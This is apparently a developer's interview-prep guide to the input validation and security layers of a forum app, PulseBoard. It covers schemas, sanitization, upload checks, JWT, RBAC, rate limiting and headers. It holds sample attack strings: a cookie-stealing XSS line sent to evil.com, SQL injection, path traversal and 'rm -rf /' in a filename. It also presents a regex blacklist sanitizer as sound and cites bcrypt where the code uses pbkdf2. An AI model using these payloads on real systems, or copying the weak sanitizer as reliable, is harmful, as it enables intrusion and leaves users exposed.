# Validation & Security Layers in PulseBoard

> Every validation and security measure in the project — with exact code
> examples, file paths, and explanations for interview discussions.

---

## Table of Contents

1. [5-Layer Validation Architecture](#1-5-layer-validation-architecture)
2. [Layer 1: Frontend Validation](#2-layer-1-frontend-validation)
3. [Layer 2: Pydantic Schema Validation](#3-layer-2-pydantic-schema-validation)
4. [Layer 3: XSS Sanitization](#4-layer-3-xss-sanitization)
5. [Layer 4: Business Logic Checks](#5-layer-4-business-logic-checks)
6. [Layer 5: Database Constraints](#6-layer-5-database-constraints)
7. [File Upload Security (5 Layers)](#7-file-upload-security-5-layers)
8. [Authentication Security](#8-authentication-security)
9. [Authorization & RBAC](#9-authorization--rbac)
10. [Rate Limiting](#10-rate-limiting)
11. [Security Headers & CSP](#11-security-headers--csp)
12. [CORS Configuration](#12-cors-configuration)
13. [Common Attack Vectors & Our Defenses](#13-common-attack-vectors--our-defenses)

---

## 1. 5-Layer Validation Architecture

Every piece of user input passes through up to 5 independent layers before
reaching the database. If one layer is bypassed (e.g., a direct API call skips
frontend validation), the next layer catches it.

```
User Input
    │
    ▼
┌────────────────────────────────────────────┐
│  Layer 1: Frontend Validation              │
│  Immediate feedback in the browser         │
│  (file type, size, required fields)        │
└────────────────────┬───────────────────────┘
                     │ HTTP Request
                     ▼
┌────────────────────────────────────────────┐
│  Layer 2: Pydantic Schema Validation       │
│  Type checking, length limits, regex       │
│  patterns, enum whitelists                 │
└────────────────────┬───────────────────────┘
                     │
                     ▼
┌────────────────────────────────────────────┐
│  Layer 3: XSS Sanitization                 │
│  Strip dangerous HTML tags, URI schemes,   │
│  event handlers from text fields           │
└────────────────────┬───────────────────────┘
                     │
                     ▼
┌────────────────────────────────────────────┐
│  Layer 4: Business Logic Checks            │
│  Permission checks, ownership, state       │
│  machine transitions, duplicate detection  │
└────────────────────┬───────────────────────┘
                     │
                     ▼
┌────────────────────────────────────────────┐
│  Layer 5: Database Constraints             │
│  NOT NULL, UNIQUE, FK, CHECK constraints   │
│  (last line of defense)                    │
└────────────────────┬───────────────────────┘
                     │
                     ▼
                 Database
```

---

## 2. Layer 1: Frontend Validation

**Purpose:** Immediate user feedback without a network round-trip. Not a
security boundary — can be bypassed with curl or browser dev tools.

### File upload validation

**File:** `frontend/src/lib/uploadUtils.js`

```javascript
/**
 * Validates a file before upload — client-side pre-check.
 * NOT a security boundary (user can bypass with curl).
 * The real validation happens server-side in storage.py.
 */
export function validateFile(file, context = "attachment") {
    const MAX_SIZE = 25 * 1024 * 1024;   // 25 MB

    if (file.size > MAX_SIZE) {
        return { valid: false, error: `File too large (max 25 MB)` };
    }

    const allowedTypes = context === "avatar"
        ? ["image/jpeg", "image/png", "image/webp", "image/gif"]
        : ["image/jpeg", "image/png", "image/webp", "image/gif",
           "video/mp4", "video/webm",
           "application/pdf", "text/plain",
           "application/msword", "application/vnd.openxmlformats-officedocument.wordprocessingml.document"];

    if (!allowedTypes.includes(file.type)) {
        return { valid: false, error: `File type not allowed` };
    }

    return { valid: true };
}
```

### File picker `accept` filters

```jsx
// File: frontend/src/pages/HomePage.jsx (avatar upload)
<input type="file" accept="image/jpeg,image/png,image/webp,image/gif" />

// File: frontend/src/pages/ThreadPage.jsx (attachments)
<input type="file" accept="image/*,video/mp4,video/webm,.pdf,.txt,.doc,.docx" />
```

### Required field checks

```jsx
// File: frontend/src/pages/HomePage.jsx (thread creation)
const handleSubmit = () => {
    if (!title.trim() || !body.trim() || !categoryId) {
        return;   // Don't submit empty forms
    }
    // ...
};
```

---

## 3. Layer 2: Pydantic Schema Validation

**Purpose:** The primary validation boundary. Rejects malformed requests with
422 Unprocessable Entity before any business logic runs. This is a security
boundary — it runs on the server.

### Thread creation schema

**File:** `services/shared/shared/schemas/thread.py:39-97`

```python
class ThreadCreateRequest(BaseModel):
    """Validates thread creation input — security boundary."""
    category_id: int = Field(ge=1)                       # Must be positive integer
    title: str = Field(min_length=3, max_length=255)     # 3-255 chars
    body: str = Field(min_length=1, max_length=10000)    # 1-10K chars
    attachment_ids: list[int] = Field(
        default_factory=list,
        max_length=20,           # Prevents: 100K attachment IDs = DoS
    )
    tag_names: list[str] = Field(
        default_factory=list,
        max_length=10,           # Prevents: 10K tags = slow DB queries
    )

    @field_validator("title")
    @classmethod
    def sanitize_title(cls, v: str) -> str:
        return sanitize_text(v)                          # Layer 3: XSS removal

    @field_validator("body")
    @classmethod
    def sanitize_body(cls, v: str) -> str:
        return sanitize_text(v)

    @field_validator("tag_names")
    @classmethod
    def sanitize_tags(cls, v: list[str]) -> list[str]:
        return [sanitize_text(tag) for tag in v]
```

### Auth schema — preventing DoS via password hashing

**File:** `services/shared/shared/schemas/auth.py:37-73`

```python
class RegisterRequest(BaseModel):
    email: EmailStr                                      # RFC 5322 validation
    username: str = Field(
        min_length=3, max_length=50,
        pattern=r"^[a-zA-Z0-9_]+$",                     # Whitelist: only safe chars
    )
    password: str = Field(
        min_length=8,
        max_length=128,    # <-- MAX prevents DoS!
        # Without max_length, an attacker could send a 10 MB password.
        # pbkdf2_sha256 with 150K iterations on 10 MB = minutes of CPU time.
    )

    @field_validator("username")
    @classmethod
    def sanitize_username_field(cls, v: str) -> str:
        return sanitize_username(v)   # Strips to [a-zA-Z0-9_] only
```

### Admin schemas — preventing privilege escalation

**File:** `services/shared/shared/schemas/admin.py:129-239`

```python
class RoleUpdateRequest(BaseModel):
    """Strict whitelist prevents 'superadmin' injection."""
    role: str = Field(pattern=r"^(admin|moderator|member)$")
    #                         ^ anchored regex = full string must match
    # Without ^$: "admin-plus" would match because it contains "admin"
    # With ^$:    "admin-plus" is rejected — only exact matches pass

class ReportResolveRequest(BaseModel):
    status: str = Field(pattern=r"^(resolved|dismissed)$")
    # Prevents: status="deleted" or status="resolved; DROP TABLE users"

class ModerationActionRequest(BaseModel):
    action_type: str = Field(pattern=r"^(warn|suspend|ban)$")
    reason: str = Field(min_length=3, max_length=2000)     # Can't be empty
    duration_hours: int | None = Field(None, ge=1, le=8760) # Max 1 year

    @field_validator("reason")
    @classmethod
    def sanitize_reason(cls, v: str) -> str:
        return sanitize_text(v)
```

### OAuth — provider whitelist

**File:** `services/shared/shared/schemas/auth.py:167-187`

```python
class OAuthExchangeRequest(BaseModel):
    provider: str = Field(pattern=r"^(google|github)$")
    # Prevents: provider="evil-server" → SSRF to attacker's server
    code: str = Field(min_length=1, max_length=2048)
    # Prevents: 10 MB authorization code → memory exhaustion
```

### Chat — list size limits prevent algorithmic attacks

**File:** `services/shared/shared/schemas/chat.py:43-77`

```python
class ChatRoomCreateRequest(BaseModel):
    name: str = Field(min_length=1, max_length=255)
    room_type: str = Field(pattern=r"^(direct|group)$")
    member_ids: list[int] = Field(max_length=50)
    # Without max_length=50:
    # POST /chat/rooms {"member_ids": [1,2,3,...,100000]}
    # → 100K DB lookups + 100K WebSocket notifications = server DoS
```

### Vote — rejecting meaningless values

**File:** `services/shared/shared/schemas/post.py`

```python
class VoteRequest(BaseModel):
    value: int = Field(ge=-1, le=1)

    @field_validator("value")
    @classmethod
    def reject_zero(cls, v: int) -> int:
        if v == 0:
            raise ValueError("Vote value cannot be 0. Use DELETE to remove.")
        return v
    # Without this: value=0 is technically valid (between -1 and 1)
    # but semantically meaningless — it's not an upvote or downvote
```

---

## 4. Layer 3: XSS Sanitization

**Purpose:** Strip dangerous HTML constructs from user input. Works alongside
React's built-in output escaping for defense in depth.

### Why NOT `html.escape()`?

```
User types:   "5 > 3 && x < 10"
html.escape:  "5 &gt; 3 &amp;&amp; x &lt; 10"
React render: "5 &amp;gt; 3 &amp;amp;&amp;amp; x &amp;lt; 10"  ← Double escaped!
User sees:    "5 &gt; 3 &amp;&amp; x &lt; 10"                  ← Broken!
```

React already escapes text when rendering via `{variable}`. If we also
`html.escape()` on input, the text gets escaped twice and displays incorrectly.

### Our approach: surgical removal of dangerous constructs only

**File:** `services/shared/shared/services/sanitize.py:71-149`

```python
# Pattern 1: Strip tags that execute code (with content between them)
_DANGEROUS_TAGS_WITH_CONTENT_RE = re.compile(
    r"<(script|iframe|object|embed|applet|form)\b[^>]*>.*?</\1>",
    re.IGNORECASE | re.DOTALL,        # DOTALL: . matches newlines too
)

# Pattern 2: Self-closing or unclosed dangerous tags
_DANGEROUS_TAGS_SELF_RE = re.compile(
    r"<(script|iframe|object|embed|applet|form)\b[^>]*/?>",
    re.IGNORECASE,
)

# Pattern 3: Dangerous URI schemes
_DANGEROUS_URI_RE = re.compile(
    r"(javascript|vbscript|data)\s*:",   # "javascript:" in href/src
    re.IGNORECASE,
)

# Pattern 4: Inline event handlers
_EVENT_HANDLER_RE = re.compile(
    r"\bon\w+\s*=",                      # "onerror=", "onclick=", etc.
    re.IGNORECASE,
)

def sanitize_text(text: str) -> str:
    """4-step pipeline: remove dangerous constructs, preserve safe text."""
    if not text:
        return text
    text = text.strip()
    text = _DANGEROUS_TAGS_WITH_CONTENT_RE.sub("", text)  # Step 1
    text = _DANGEROUS_TAGS_SELF_RE.sub("", text)          # Step 2
    text = _DANGEROUS_URI_RE.sub("", text)                # Step 3
    text = _EVENT_HANDLER_RE.sub("", text)                # Step 4
    return text.strip()
```

### Username sanitization — strictest form

**File:** `services/shared/shared/services/sanitize.py:152-177`

```python
def sanitize_username(username: str) -> str:
    """Alphanumeric + underscore ONLY. Everything else is stripped."""
    return re.sub(r"[^a-zA-Z0-9_]", "", username)
    # "alice<script>" → "alicescript"
    # "admin/../etc"  → "adminetc"
    # "@pulse"        → "pulse"
```

### What each step catches:

| Attack | Input | After sanitization |
|--------|-------|--------------------|
| Script injection | `Hello<script>alert(1)</script>` | `Hello` |
| Iframe injection | `<iframe src="evil.com"></iframe>` | `` |
| JS URI | `<a href="javascript:alert(1)">click</a>` | `<a href="alert(1)">click</a>` |
| Event handler | `<img src="x" onerror="alert(1)">` | `<img src="x" ="alert(1)">` |
| Path traversal (username) | `../../../etc/passwd` | `etcpasswd` |

---

## 5. Layer 4: Business Logic Checks

**Purpose:** Application-level rules that go beyond format validation — ownership
checks, state machine transitions, duplicate detection, permission verification.

### Permission checks

**File:** `services/shared/shared/core/auth_helpers.py`

```python
def require_role(user: User, roles: list[str]) -> None:
    """Raise 403 if user doesn't have required role."""
    if user.role not in roles:
        raise HTTPException(403, "You do not have permission to perform this action.")

def require_can_participate(user: User) -> None:
    """Suspended users can read but not write."""
    if user.is_suspended:
        raise HTTPException(403, "Your account is suspended.")
```

### Ownership verification

**File:** `services/community/app/forum_services.py`

```python
def update_thread(db, thread_id, data, current_user):
    thread = db.query(Thread).get(thread_id)
    if not thread:
        raise HTTPException(404, "Thread not found.")

    # Only the author or staff can edit
    if thread.author_id != current_user.id and current_user.role not in ("admin", "moderator"):
        raise HTTPException(403, "You can only edit your own threads.")

    # Can't edit a locked thread (unless you're staff)
    if thread.is_locked and current_user.role not in ("admin", "moderator"):
        raise HTTPException(403, "This thread is locked.")
```

### State machine — vote toggle

**File:** `services/community/app/forum_services.py`

```python
def cast_vote(db, user, entity_type, entity_id, value):
    existing = db.query(Vote).filter(
        Vote.user_id == user.id,
        Vote.entity_type == entity_type,
        Vote.entity_id == entity_id,
    ).first()

    if existing and existing.value == value:
        db.delete(existing)           # Same vote → toggle OFF (idempotent)
    elif existing:
        existing.value = value        # Different vote → flip (+1 ↔ -1)
    else:
        db.add(Vote(user_id=user.id, entity_type=entity_type,
                     entity_id=entity_id, value=value))

    db.commit()
```

### Duplicate detection

**File:** `services/core/app/auth_services.py`

```python
def register(db, data):
    existing = db.query(User).filter(
        (User.email == data.email) | (User.username == data.username)
    ).first()
    if existing:
        if existing.email == data.email:
            raise HTTPException(409, "Email already registered.")
        raise HTTPException(409, "Username already taken.")
```

### Anti-enumeration — password reset

**File:** `services/core/app/auth_services.py`

```python
def forgot_password(db, email: str):
    user = db.query(User).filter(User.email == email).first()
    if not user:
        return {"message": "If that email exists, a reset link has been sent."}
        # Same response whether email exists or not!
        # Prevents: attacker testing "does alice@example.com have an account?"
    _send_reset_email(user)
    return {"message": "If that email exists, a reset link has been sent."}
```

---

## 6. Layer 5: Database Constraints

**Purpose:** The last line of defense. Even if all application layers are
bypassed (e.g., direct SQL injection), database constraints prevent invalid data.

**File:** `services/shared/shared/models/` (various model files)

```python
# NOT NULL — field must have a value
class User(Base):
    email = Column(String(255), nullable=False)
    username = Column(String(50), nullable=False)
    password_hash = Column(String(255), nullable=False)

# UNIQUE — no duplicates
    email = Column(String(255), unique=True)
    username = Column(String(50), unique=True)

# Foreign Key — referential integrity
class Thread(Base):
    author_id = Column(Integer, ForeignKey("users.id"), nullable=False)
    category_id = Column(Integer, ForeignKey("categories.id"), nullable=False)

class Post(Base):
    thread_id = Column(Integer, ForeignKey("threads.id"), nullable=False)
    author_id = Column(Integer, ForeignKey("users.id"), nullable=False)

# Index — performance + implicit uniqueness
class Vote(Base):
    __table_args__ = (
        Index("ix_votes_user_entity", "user_id", "entity_type", "entity_id", unique=True),
        # One vote per user per entity — enforced at DB level even if app logic fails
    )

# Default values
class User(Base):
    role = Column(String(20), default="member")
    is_active = Column(Boolean, default=True)
    is_banned = Column(Boolean, default=False)
    is_verified = Column(Boolean, default=False)
```

**What each constraint prevents:**

| Constraint | Prevents |
|-----------|----------|
| `nullable=False` | NULL values in required fields |
| `unique=True` on email | Two accounts with same email |
| `ForeignKey("users.id")` | Thread pointing to non-existent user |
| `unique=True` on vote index | User voting twice on same post |
| `default="member"` | User created without a role (null role = no permissions) |

---

## 7. File Upload Security (5 Layers)

**File:** `services/shared/shared/services/storage.py`

Uploads pass through 5 independent validation layers:

### Layer 1: MIME type whitelist

```python
ALLOWED_CONTENT_TYPES = {
    "image/jpeg": "image",
    "image/png": "image",
    "image/gif": "image",
    "image/webp": "image",
    "video/mp4": "video",
    "video/webm": "video",
    "application/pdf": "document",
    "text/plain": "document",
    # ... etc
}

# Deny by default — if content_type is not in the dict, reject it
if content_type not in ALLOWED_CONTENT_TYPES:
    raise HTTPException(400, f"File type {content_type} is not allowed.")
```

### Layer 2: File extension whitelist

```python
ALLOWED_EXTENSIONS = {".jpg", ".jpeg", ".png", ".gif", ".webp",
                      ".mp4", ".webm", ".pdf", ".txt", ".doc", ".docx"}

ext = Path(filename).suffix.lower()
if ext not in ALLOWED_EXTENSIONS:
    raise HTTPException(400, f"File extension {ext} is not allowed.")
```

### Layer 3: Extension-MIME cross-validation

```python
_EXTENSION_MIME_MAP = {
    ".jpg": "image/jpeg", ".jpeg": "image/jpeg",
    ".png": "image/png", ".gif": "image/gif",
    ".webp": "image/webp", ".mp4": "video/mp4",
    # ...
}

expected_mime = _EXTENSION_MIME_MAP.get(ext)
if expected_mime and expected_mime != content_type:
    raise HTTPException(400, "File extension does not match content type.")
# Catches: file.jpg with Content-Type: application/x-php
```

### Layer 4: Magic byte verification

```python
_MAGIC_SIGNATURES = {
    "image/jpeg": [(0, b"\xff\xd8\xff")],              # JPEG magic bytes
    "image/png":  [(0, b"\x89PNG\r\n\x1a\n")],         # PNG magic bytes
    "image/gif":  [(0, b"GIF89a"), (0, b"GIF87a")],    # GIF (two versions)
    "image/webp": [(8, b"WEBP")],                       # WebP at offset 8
    "video/mp4":  [(4, b"ftyp")],                       # MP4 container
    "video/webm": [(0, b"\x1a\x45\xdf\xa3")],          # WebM EBML header
    "application/pdf": [(0, b"%PDF")],                  # PDF magic bytes
}

def _verify_magic_bytes(file_bytes: bytes, content_type: str) -> bool:
    """Read actual file bytes and verify they match the declared type."""
    signatures = _MAGIC_SIGNATURES.get(content_type, [])
    for offset, magic in signatures:
        if file_bytes[offset:offset + len(magic)] == magic:
            return True
    return len(signatures) == 0    # Unknown types pass (no signature to check)
```

**Why magic bytes matter:**

```
Attack: Rename malicious.php to malicious.jpg
MIME type: image/jpeg (set by attacker in Content-Type header)
Extension: .jpg (looks fine)
Magic bytes: File starts with "<?php" not "FF D8 FF" → REJECTED!
```

### Layer 5: Filename sanitization

```python
_SAFE_FILENAME_RE = re.compile(r"[^a-zA-Z0-9._\-]")

def _sanitize_filename(raw: str) -> str:
    """Prevent directory traversal and command injection via filenames."""
    name = Path(raw).name          # "../../etc/passwd" → "passwd"
    name = _SAFE_FILENAME_RE.sub("_", name)   # "file;rm -rf /" → "file_rm__rf__"
    name = re.sub(r"_+", "_", name)           # Collapse repeated underscores
    return name or "unnamed_file"              # Never return empty string
```

### Entity type whitelist for uploads

```python
# File: services/core/app/upload_routes.py
ALLOWED_ENTITY_TYPES = {"draft", "thread", "post", "message", "avatars"}

if linked_entity_type not in ALLOWED_ENTITY_TYPES:
    raise HTTPException(400, "Invalid entity type.")
# Prevents: linked_entity_type="../../etc" → path traversal in storage path
```

---

## 8. Authentication Security

### Password hashing — pbkdf2_sha256

**File:** `services/shared/shared/core/security.py`

```python
import warnings
with warnings.catch_warnings():
    warnings.simplefilter("ignore", DeprecationWarning)
    from passlib.context import CryptContext

password_context = CryptContext(schemes=["pbkdf2_sha256"], deprecated="auto")
# pbkdf2_sha256 with 150,000 iterations (passlib default)
# Takes ~100ms to hash — fast enough for users, too slow for brute force
# 10 billion guesses × 100ms = 31,709 years

def hash_password(password: str) -> str:
    return password_context.hash(password)

def verify_password(plain_password: str, hashed_password: str) -> bool:
    return password_context.verify(plain_password, hashed_password)
```

### JWT structure

```python
def create_token(subject, expires_delta, token_type="access", extra_claims=None):
    payload = {
        "sub": str(subject),                           # User ID
        "exp": datetime.now(UTC) + expires_delta,      # Expiration time
        "type": token_type,                            # "access" or "refresh"
        "iat": int(datetime.now(UTC).timestamp()),     # Issued at
    }
    if extra_claims:
        payload.update(extra_claims)
    return jwt.encode(payload, settings.secret_key, algorithm="HS256")
```

### Token validation guards

**File:** `services/shared/shared/core/auth_helpers.py`

```python
def get_current_user(token=Depends(oauth2_scheme), db=Depends(get_db)):
    payload = safe_decode_token(token)

    # Guard 1: Token must be valid and be an access token
    if not payload or payload.get("type") != "access":
        raise HTTPException(401, "Could not validate credentials.")

    # Guard 2: Subject claim must exist
    subject = payload.get("sub")
    if not subject:
        raise HTTPException(401, "Could not validate credentials.")

    # Guard 3: User must exist and not be banned/inactive
    user = db.execute(select(User).where(User.id == int(subject))).scalar_one_or_none()
    if not user or user.is_banned or not user.is_active:
        raise HTTPException(401, "Could not validate credentials.")

    # Side effect: update last_seen for online status
    user.last_seen = datetime.now(timezone.utc)
    db.commit()
    return user
```

### Refresh token revocation

```python
def refresh_token(db, refresh_token_str):
    payload = safe_decode_token(refresh_token_str)
    if payload.get("type") != "refresh":
        raise HTTPException(401, "Invalid token type.")

    token_id = payload.get("token_id")
    stored = db.query(RefreshToken).filter(RefreshToken.id == token_id).first()

    if not stored or stored.is_revoked:
        raise HTTPException(401, "Token has been revoked.")

    # Revoke the old token and issue a new pair
    stored.is_revoked = True
    db.commit()

    new_access = create_access_token(str(stored.user_id))
    new_refresh = create_refresh_token(str(stored.user_id), new_token_id)
    return {"access_token": new_access, "refresh_token": new_refresh}
```

---

## 9. Authorization & RBAC

**Concept:** Role-Based Access Control — users have roles (admin, moderator,
member) that determine what actions they can perform.

### Role hierarchy

```
admin      → Can do everything
moderator  → Can moderate (lock, pin, delete, ban) + member actions
member     → Can create content, vote, react, report
guest      → Can read only (no auth token)
```

### Permission helpers

**File:** `services/shared/shared/core/auth_helpers.py`

```python
def require_role(user: User, roles: list[str]) -> None:
    if user.role not in roles:
        raise HTTPException(403, "You do not have permission.")

def require_can_participate(user: User) -> None:
    if user.is_suspended:
        raise HTTPException(403, "Your account is suspended.")
```

### Route-level enforcement

```python
# File: services/community/app/admin_routes.py

@router.get("/reports")
def list_reports(current_user=Depends(get_current_user), db=Depends(get_db)):
    require_role(current_user, ["admin", "moderator"])    # Staff only
    return admin_services.list_reports(db, current_user)

@router.post("/users/{user_id}/role")
def change_role(user_id: int, data: RoleUpdateRequest,
                current_user=Depends(get_current_user), db=Depends(get_db)):
    require_role(current_user, ["admin"])                  # Admin only
    return admin_services.change_user_role(db, user_id, data, current_user)
```

### Audit log role-based visibility

**File:** `services/shared/shared/services/audit.py`

```python
def list_audit_logs(db, current_user, page, page_size, filters):
    query = select(AuditLog)

    if current_user.role == "admin":
        pass                                    # Admin sees ALL logs
    elif current_user.role == "moderator":
        # Moderator sees own logs + member logs (not admin logs)
        query = query.where(
            (AuditLog.actor_id == current_user.id) |
            (AuditLog.actor_id.in_(member_ids))
        )
    else:
        # Member sees only their own logs
        query = query.where(AuditLog.actor_id == current_user.id)
```

---

## 10. Rate Limiting

**File:** `services/shared/shared/core/rate_limit.py`

### Algorithm: Sliding window counter

```python
class RateLimitMiddleware(BaseHTTPMiddleware):
    def __init__(self, app, rate_limit=20, window_seconds=60, paths=None):
        self._rate_limit = rate_limit        # Max requests per window
        self._window_seconds = window_seconds # Window size
        self._paths = paths or []            # Only rate-limit these prefixes
        self._requests = defaultdict(list)   # IP -> [timestamp, ...]

    def _clean_and_count(self, ip: str) -> int:
        now = time.monotonic()
        cutoff = now - self._window_seconds
        self._requests[ip] = [ts for ts in self._requests[ip] if ts > cutoff]
        return len(self._requests[ip])

    async def dispatch(self, request, call_next):
        if not self._should_limit(request.url.path):
            return await call_next(request)

        ip = request.client.host
        if self._clean_and_count(ip) >= self._rate_limit:
            return JSONResponse(
                status_code=429,
                content={"detail": "Too many requests."},
                headers={"Retry-After": str(self._window_seconds)},
            )
        self._requests[ip].append(time.monotonic())
        return await call_next(request)
```

### Where rate limiting is applied

```python
# Gateway: rate-limits auth endpoints proxied to Core
# File: services/gateway/app/main.py
app.add_middleware(RateLimitMiddleware, rate_limit=20, paths=["/api/v1/auth/"])

# Core: rate-limits auth endpoints directly (if accessed without gateway)
# File: services/core/app/main.py
app.add_middleware(RateLimitMiddleware, rate_limit=20, paths=["/api/v1/auth/"])
```

### Why `time.monotonic()` instead of `time.time()`

```
time.time()      → System wall clock. Can jump backward (NTP sync).
time.monotonic() → Monotonically increasing. Never goes backward.

If time.time() jumps backward by 30 seconds:
  Old timestamps suddenly appear to be in the future
  → _clean_and_count keeps them all → false rate limiting
  → legitimate users get 429 errors for no reason

time.monotonic() is immune to this.
```

---

## 11. Security Headers & CSP

**File:** `services/shared/shared/core/security_headers.py`

### All headers set

```python
class SecurityHeadersMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request, call_next):
        response = await call_next(request)

        # Prevent MIME sniffing (browser guessing file type)
        response.headers["X-Content-Type-Options"] = "nosniff"

        # Prevent clickjacking via iframe embedding
        response.headers["X-Frame-Options"] = "DENY"

        # Legacy XSS filter for older browsers (IE, old Chrome)
        response.headers["X-XSS-Protection"] = "1; mode=block"

        # Control what URL info is sent to other sites
        response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"

        # Block camera, mic, geolocation, payment APIs
        response.headers["Permissions-Policy"] = (
            "camera=(), microphone=(), geolocation=(), payment=()"
        )

        # Don't cache authenticated responses
        if "authorization" in {k.lower() for k in request.headers.keys()}:
            response.headers["Cache-Control"] = "no-store"

        # Content Security Policy — the most important header
        response.headers["Content-Security-Policy"] = (
            "default-src 'self'; "
            "script-src 'self'; "                    # Only our scripts
            "style-src 'self' 'unsafe-inline'; "     # Allow inline styles (React)
            "img-src 'self' data: blob: https:; "    # Allow OAuth avatars
            "connect-src 'self' ws: wss:; "          # Allow WebSocket
            "frame-ancestors 'none'; "               # Same as X-Frame-Options
        )

        return response
```

### What each header prevents

| Header | Attack prevented |
|--------|-----------------|
| `X-Content-Type-Options: nosniff` | Browser treating a `.txt` file as HTML and executing scripts in it |
| `X-Frame-Options: DENY` | Clickjacking — attacker embeds your page in an invisible iframe to steal clicks |
| `Content-Security-Policy` | XSS — even if `<script>` tags make it into the HTML, CSP blocks them from executing |
| `Referrer-Policy` | Token leakage — prevents URL query params (e.g., reset tokens) from being sent in Referer header |
| `Cache-Control: no-store` | Session hijacking — prevents proxy/CDN from caching authenticated responses |
| `Permissions-Policy` | Feature abuse — prevents scripts from accessing camera/mic/location |

### CSP in detail

```
default-src 'self'        → Only load resources from same origin
script-src 'self'         → Only execute scripts from same origin
                            Blocks: <script>alert(1)</script> (inline)
                            Blocks: <script src="evil.com/malware.js">
style-src 'self' 'unsafe-inline'
                          → Allow inline styles (needed for React)
img-src 'self' data: blob: https:
                          → Allow images from: same origin, data URIs (base64),
                            blob URLs (canvas), HTTPS (OAuth avatars from Google/GitHub)
connect-src 'self' ws: wss:
                          → Allow XHR/fetch to same origin + WebSocket connections
frame-ancestors 'none'    → Nobody can embed this page in an iframe
```

---

## 12. CORS Configuration

**Concept:** Cross-Origin Resource Sharing restricts which domains can make API
requests. Without CORS, any website could make requests to your API using a
logged-in user's cookies.

**File:** `services/gateway/app/main.py`

```python
app.add_middleware(
    CORSMiddleware,
    allow_origins=["http://localhost:5173"],   # Only frontend origin
    allow_credentials=True,                     # Allow Authorization header
    allow_methods=["*"],                        # All HTTP methods
    allow_headers=["*"],                        # All headers
)
```

**What CORS prevents:**

```
User is logged into PulseBoard (has JWT in localStorage).
User visits malicious-site.com.
malicious-site.com JavaScript tries:
  fetch("http://localhost:8000/api/v1/admin/users", {headers: {Authorization: stolenJWT}})

Without CORS: Request succeeds — attacker gets user list.
With CORS:    Browser blocks the request — "Origin not allowed."
```

**Note:** CORS is a browser-enforced policy. `curl` and Postman ignore it.
That's why CORS is one layer in defense-in-depth, not the only defense.

---

## 13. Common Attack Vectors & Our Defenses

### XSS (Cross-Site Scripting)

| Layer | Defense | File |
|-------|---------|------|
| Backend | `sanitize_text()` strips `<script>`, `javascript:`, `onerror=` | `sanitize.py` |
| Frontend | React auto-escapes `{variable}` in JSX | All `.jsx` files |
| Browser | CSP blocks inline scripts and external script sources | `security_headers.py` |

**Attack example:**
```
Input:   "Hello<script>document.location='evil.com/?c='+document.cookie</script>"
After sanitize_text(): "Hello"
React would render: "Hello&lt;script&gt;..." (escaped, but we already stripped it)
CSP would block:     script execution even if it somehow made it to the DOM
```

### SQL Injection

| Layer | Defense | File |
|-------|---------|------|
| ORM | SQLAlchemy parameterized queries (never string concatenation) | All service files |
| Schema | Username `^[a-zA-Z0-9_]+$` pattern | `auth.py` |
| Schema | `sanitize_username()` strips non-alphanumeric | `sanitize.py` |

**Attack example:**
```
Input:   username = "admin'; DROP TABLE users; --"
Pydantic: Rejected by pattern="^[a-zA-Z0-9_]+$" (422 error)
Even if bypassed, SQLAlchemy would send:
  WHERE users.username = 'admin''; DROP TABLE users; --'
  (parameterized — the entire string is treated as data, not SQL)
```

### CSRF (Cross-Site Request Forgery)

| Defense | How |
|---------|-----|
| JWT in Authorization header | Not automatically sent by browser (unlike cookies) |
| CORS | Blocks cross-origin requests from malicious sites |
| SameSite cookies not used | We use localStorage for tokens — no cookie-based auth |

### Directory Traversal

| Layer | Defense | File |
|-------|---------|------|
| Filename sanitization | `Path(raw).name` strips `../` | `storage.py` |
| Entity type whitelist | Only `{draft, thread, post, message, avatars}` | `upload_routes.py` |
| Username sanitization | Strips `/`, `.`, spaces | `sanitize.py` |

**Attack example:**
```
Filename: "../../../etc/passwd"
Path("../../../etc/passwd").name → "passwd"
After sanitization: "passwd" (stored safely in uploads directory)
```

### Brute Force

| Layer | Defense | File |
|-------|---------|------|
| Rate limiting | 20 requests/minute on `/api/v1/auth/` | `rate_limit.py` |
| Password hashing | pbkdf2_sha256 (150K iterations, ~100ms/hash) | `security.py` |
| Account lockout | `is_banned` / `is_suspended` flags | `auth_helpers.py` |

### Privilege Escalation

| Layer | Defense | File |
|-------|---------|------|
| Role regex whitelist | `^(admin|moderator|member)$` — no "superadmin" | `admin.py` |
| Server-side role checks | `require_role(user, ["admin"])` on every admin route | `admin_routes.py` |
| Server-computed permissions | `can_suspend`, `can_ban`, `can_change_role` flags | `admin.py` |

**Attack example:**
```
POST /api/v1/admin/users/5/role
Body: {"role": "superadmin"}
Pydantic: Rejected by pattern="^(admin|moderator|member)$" (422 error)

POST /api/v1/admin/users/5/role
Body: {"role": "admin"}
Auth: Requires current_user.role == "admin" (403 if moderator tries)
```

### MIME Type Spoofing (File Upload)

| Layer | Defense | File |
|-------|---------|------|
| MIME whitelist | Content-Type must be in allowed list | `storage.py` |
| Extension whitelist | File extension must be in allowed set | `storage.py` |
| Cross-validation | Extension must match MIME type | `storage.py` |
| Magic bytes | File header bytes must match declared type | `storage.py` |

**Attack example:**
```
File: malware.php (renamed to malware.jpg)
Content-Type header: image/jpeg (set by attacker)
Extension check: .jpg → passes
Cross-validation: .jpg → image/jpeg → passes
Magic bytes: File starts with "<?php" not "FF D8 FF" → REJECTED!
```

### User Enumeration

| Layer | Defense | File |
|-------|---------|------|
| Generic error messages | "Invalid credentials" (not "user not found" vs "wrong password") | `auth_services.py` |
| Consistent timing | Same response time whether user exists or not (bcrypt always runs) | `auth_services.py` |
| Password reset | "If that email exists..." (same response always) | `auth_services.py` |

### DoS via Large Input

| Layer | Defense | File |
|-------|---------|------|
| Password max length | `max_length=128` prevents expensive hashing of 10 MB input | `auth.py` |
| List size caps | `max_length=50` on member_ids, `max_length=20` on attachments | `chat.py`, `thread.py` |
| Body size limits | `max_length=10000` on thread body, `max_length=5000` on messages | `thread.py`, `chat.py` |
| Search query limit | `max_length=200` on search query | Search route |
| File size limit | 25 MB max upload | `storage.py` |

---

*Every security measure listed here has inline comments in the actual source
code explaining the rationale. Open the referenced file and search for the
comment to see it in context.*
